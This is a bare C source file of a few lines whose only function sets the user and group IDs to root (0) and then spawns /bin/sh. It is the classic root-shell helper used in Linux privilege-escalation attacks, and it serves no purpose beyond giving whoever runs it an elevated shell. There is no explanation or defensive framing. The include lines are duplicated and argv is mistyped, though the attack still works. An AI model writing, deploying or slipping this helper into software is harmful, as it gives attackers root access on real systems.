#include<stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/types.h>
#include <unistd.h>

int main (int argc, char * argv) { setuid(0); setgid(0); system("/bin/sh"); }
